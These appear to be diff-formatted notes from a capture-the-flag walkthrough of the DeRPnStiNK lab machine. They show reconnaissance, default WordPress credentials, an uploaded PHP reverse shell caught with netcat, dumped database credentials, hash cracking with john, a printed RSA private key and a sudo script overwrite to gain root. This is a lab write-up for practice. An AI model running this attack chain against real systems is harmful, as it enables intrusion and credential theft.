@@ -1,0 +1,244 @@
+└─$ nmap -sSCV -p 21,22,80 192.168.56.139
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-07 22:28 PDT
+Nmap scan report for 192.168.56.139
+Host is up (0.00089s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.2
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
+|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
+|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
+|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+| http-robots.txt: 2 disallowed entries 
+|_/php/ /temporary/
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: DeRPnStiNK
+
+
+
+[22:30:47] 301 -  312B  - /js  ->  http://192.168.56.139/js/                
+[22:30:47] 301 -  313B  - /php  ->  http://192.168.56.139/php/              
+[22:30:58] 301 -  313B  - /css  ->  http://192.168.56.139/css/              
+[22:31:03] 301 -  320B  - /javascript  ->  http://192.168.56.139/javascript/
+[22:31:04] 403 -  284B  - /js/                                              
+[22:31:09] 403 -  285B  - /php/                                             
+[22:31:09] 200 -    3KB - /php/phpmyadmin/                                  
+[22:31:12] 200 -   53B  - /robots.txt                                       
+
+22:40:29] 403 -  306B  - /php/phpmyadmin/.htpasswds
+[22:40:29] 403 -  310B  - /php/phpmyadmin/.htpasswd_test
+[22:40:29] 403 -  307B  - /php/phpmyadmin/.httr-oauth
+[22:40:29] 403 -  300B  - /php/phpmyadmin/.php
+[22:40:29] 403 -  301B  - /php/phpmyadmin/.php3
+[22:40:41] 200 -    3KB - /php/phpmyadmin/export.php
+[22:40:41] 200 -   18KB - /php/phpmyadmin/favicon.ico
+[22:40:43] 200 -    3KB - /php/phpmyadmin/import.php
+[22:40:44] 200 -    6KB - /php/phpmyadmin/js/config.js
+[22:40:44] 403 -  299B  - /php/phpmyadmin/js/
+[22:40:44] 403 -  314B  - /php/phpmyadmin/libraries/tiny_mce
+[22:40:44] 403 -  305B  - /php/phpmyadmin/libraries
+[22:40:44] 403 -  306B  - /php/phpmyadmin/libraries/
+[22:40:44] 403 -  315B  - /php/phpmyadmin/libraries/tiny_mce/
+[22:40:44] 403 -  314B  - /php/phpmyadmin/libraries/tinymce/
+[22:40:44] 403 -  316B  - /php/phpmyadmin/libraries/phpmailer/
+[22:40:44] 403 -  313B  - /php/phpmyadmin/libraries/tinymce
+[22:40:45] 200 -    3KB - /php/phpmyadmin/license.php
+[22:40:48] 200 -    3KB - /php/phpmyadmin/phpinfo.php
+[22:40:52] 401 -  460B  - /php/phpmyadmin/setup
+[22:40:52] 401 -  460B  - /php/phpmyadmin/setup/
+[22:40:53] 200 -    3KB - /php/phpmyadmin/sql.php
+[22:40:55] 301 -  331B  - /php/phpmyadmin/themes  ->  http://192.168.56.139/php/phpmyadmin/themes/
+[22:40:55] 403 -  303B  - /php/phpmyadmin/themes/
+
+└─$ sudo dirsearch -u http://192.168.56.139/ -w /usr/share/dirb/wordlists/big.txt 
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 20469
+
+Output File: /home/ed/reports/http_192.168.56.139/__25-04-07_22-55-58.txt
+
+Target: http://192.168.56.139/
+
+[22:55:58] Starting: 
+[22:56:08] 301 -  313B  - /css  ->  http://192.168.56.139/css/
+[22:56:19] 301 -  320B  - /javascript  ->  http://192.168.56.139/javascript/
+[22:56:19] 301 -  312B  - /js  ->  http://192.168.56.139/js/
+[22:56:29] 301 -  313B  - /php  ->  http://192.168.56.139/php/
+[22:56:35] 200 -   53B  - /robots.txt
+[22:56:38] 403 -  294B  - /server-status
+[22:56:43] 301 -  319B  - /temporary  ->  http://192.168.56.139/temporary/
+[22:56:49] 301 -  316B  - /weblog  ->  http://192.168.56.139/weblog/
+
+
+http://derpnstink.local/weblog/wp-admin/profile.php
+//admin admin
+
+//under slideshow plugins, upload a php reverseshell.
+└─$ nc -nvlp 8888
+listening on [any] 8888 ...
+connect to [192.168.56.105] from (UNKNOWN) [192.168.56.139] 45458
+Linux DeRPnStiNK 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
+ 10:35:18 up  1:08,  0 users,  load average: 0.00, 0.04, 0.01
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+
+//flag1 to view the source page of http://192.168.56.139/
+flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166) --
+
+www-data@DeRPnStiNK:/var/www/html/weblog$ cat wp-config.php
+cat wp-config.php
+<?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the
+ * installation. You don't have to use the web site, you can
+ * copy this file to "wp-config.php" and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://codex.wordpress.org/Editing_wp-config.php
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'wordpress');
+
+/** MySQL database username */
+define('DB_USER', 'root');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'mysql');
+
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+
+/** Database Charset to use in creating database tables. */
+define('DB_CHARSET', 'utf8');
+
+/** The Database Collate type. Don't change this if in doubt. */
+define('DB_COLLATE', '');
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ *
+ * Change these to different unique phrases!
+ * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+
+unclestinky 	$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41 	unclestinky 	unclestinky@DeRPnStiNK.local 		2017-11-12 03:25:32 	1510544888:$P$BQbCmzW/ICRqb1hU96nIVUFOlNMKJM1 	0 	unclestinky 	
+	Edit Edit 	Copy Copy 	Delete Delete 	2 	admin 	$P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/ 	admin 	admin@derpnstink.local 		2017-11-13 04:29:35 	
+
+
+─$ john --wordlist=/home/ed/Downloads/rockyou.txt 1.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:35 7.60% (ETA: 02:01:38) 0g/s 35263p/s 35263c/s 35263C/s taty$21..tatisca
+0g 0:00:00:40 8.79% (ETA: 02:01:33) 0g/s 35289p/s 35289c/s 35289C/s pampitz..pamcar
+0g 0:00:00:41 9.02% (ETA: 02:01:32) 0g/s 35301p/s 35301c/s 35301C/s nervens..neptune9
+0g 0:00:00:42 9.23% (ETA: 02:01:33) 0g/s 35222p/s 35222c/s 35222C/s monablue..momomo66
+0g 0:00:00:43 9.43% (ETA: 02:01:33) 0g/s 35133p/s 35133c/s 35133C/s mckensy..mcfly88
+0g 0:00:00:44 9.64% (ETA: 02:01:34) 0g/s 35048p/s 35048c/s 35048C/s maballsronfire1..ma2009
+wedgie57         (?)     
+1g 0:00:01:24 DONE (2025-04-10 01:55) 0.01183g/s 33102p/s 33102c/s 33102C/s wedner12..wedding896
+
+//as only have user stinky, try it with the passwd
+su stinky 
+Password: wedgie57
+
+stinky@DeRPnStiNK:/usr/share$ 
+
+stinky@DeRPnStiNK:~/Desktop$ cat flag.txt
+cat flag.txt
+flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)
+//this means flag2 is a file with www-data privi or can view in the web brower.
+
+http://derpnstink.local/weblog/wp-admin/post.php?post=8&action=edit
+flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)
+
+
+stinky@DeRPnStiNK:~/ftp/files/ssh/ssh/ssh/ssh/ssh/ssh/ssh$ cat key.txt
+cat key.txt
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAwSaN1OE76mjt64fOpAbKnFyikjz4yV8qYUxki+MjiRPqtDo4
+2xba3Oo78y82svuAHBm6YScUos8dHUCTMLA+ogsmoDaJFghZEtQXugP8flgSk9cO
+uJzOt9ih/MPmkjzfvDL9oW2Nh1XIctVfTZ6o8ZeJI8Sxh8Eguh+dw69M+Ad0Dimn
+AKDPdL7z7SeWg1BJ1q/oIAtJnv7yJz2iMbZ6xOj6/ZDE/2trrrdbSyMc5CyA09/f
+5xZ9f1ofSYhiCQ+dp9CTgH/JpKmdsZ21Uus8cbeGk1WpT6B+D8zoNgRxmO3/VyVB
+LHXaio3hmxshttdFp4bFc3foTTSyJobGoFX+ewIDAQABAoIBACESDdS2H8EZ6Cqc
+nRfehdBR2A/72oj3/1SbdNeys0HkJBppoZR5jE2o2Uzg95ebkiq9iPjbbSAXICAD
+D3CVrJOoHxvtWnloQoADynAyAIhNYhjoCIA5cPdvYwTZMeA2BgS+IkkCbeoPGPv4
+ZpHuqXR8AqIaKl9ZBNZ5VVTM7fvFVl5afN5eWIZlOTDf++VSDedtR7nL2ggzacNk
+Q8JCK9mF62wiIHK5Zjs1lns4Ii2kPw+qObdYoaiFnexucvkMSFD7VAdfFUECQIyq
+YVbsp5tec2N4HdhK/B0V8D4+6u9OuoiDFqbdJJWLFQ55e6kspIWQxM/j6PRGQhL0
+DeZCLQECgYEA9qUoeblEro6ICqvcrye0ram38XmxAhVIPM7g5QXh58YdB1D6sq6X
+VGGEaLxypnUbbDnJQ92Do0AtvqCTBx4VnoMNisce++7IyfTSygbZR8LscZQ51ciu
+Qkowz3yp8XMyMw+YkEV5nAw9a4puiecg79rH9WSr4A/XMwHcJ2swloECgYEAyHn7
+VNG/Nrc4/yeTqfrxzDBdHm+y9nowlWL+PQim9z+j78tlWX/9P8h98gOlADEvOZvc
+fh1eW0gE4DDyRBeYetBytFc0kzZbcQtd7042/oPmpbW55lzKBnnXkO3BI2bgU9Br
+7QTsJlcUybZ0MVwgs+Go1Xj7PRisxMSRx8mHbvsCgYBxyLulfBz9Um/cTHDgtTab
+L0LWucc5KMxMkTwbK92N6U2XBHrDV9wkZ2CIWPejZz8hbH83Ocfy1jbETJvHms9q
+cxcaQMZAf2ZOFQ3xebtfacNemn0b7RrHJibicaaM5xHvkHBXjlWN8e+b3x8jq2b8
+gDfjM3A/S8+Bjogb/01JAQKBgGfUvbY9eBKHrO6B+fnEre06c1ArO/5qZLVKczD7
+RTazcF3m81P6dRjO52QsPQ4vay0kK3vqDA+s6lGPKDraGbAqO+5paCKCubN/1qP1
+14fUmuXijCjikAPwoRQ//5MtWiwuu2cj8Ice/PZIGD/kXk+sJXyCz2TiXcD/qh1W
+pF13AoGBAJG43weOx9gyy1Bo64cBtZ7iPJ9doiZ5Y6UWYNxy3/f2wZ37D99NSndz
+UBtPqkw0sAptqkjKeNtLCYtHNFJAnE0/uAGoAyX+SHhas0l2IYlUlk8AttcHP1kA
+a4Id4FlCiJAXl3/ayyrUghuWWA3jMW3JgZdMyhU3OV+wyZz25S8o
+-----END RSA PRIVATE KEY-----
+
+//in the pcap file, we find
+mrderp
+derpderpderpderpderpderpderp
+
+mrderp@DeRPnStiNK:/home/stinky/.ssh$ sudo -l
+sudo -l
+[sudo] password for mrderp: derpderpderpderpderpderpderp
+
+Matching Defaults entries for mrderp on DeRPnStiNK:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User mrderp may run the following commands on DeRPnStiNK:
+    (ALL) /home/mrderp/binaries/derpy*
+
+chmod +x derpy1.sh
+mrderp@DeRPnStiNK:~/binaries$ sudo ./derpy1.sh
+sudo ./derpy1.sh
+[sudo] password for mrderp: derpderpderpderpderpderpderp
+
+./derpy1.sh: 1: ./derpy1.sh: #/bin/sh: not found
+mrderp@DeRPnStiNK:~/binaries$ echo "/bin/bash" > derpy1.sh
+echo "/bin/bash" > derpy1.sh
+mrderp@DeRPnStiNK:~/binaries$ sudo ./derpy1.sh
+sudo ./derpy1.sh
+root@DeRPnStiNK:~/binaries# cd /root
+
+
+root@DeRPnStiNK:/root/Desktop# cat flag.txt
+cat flag.txt
+flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)
+
+Congrats on rooting my first VulnOS!
+
+Hit me up on twitter and let me know your thoughts!
+
+@securekomodo
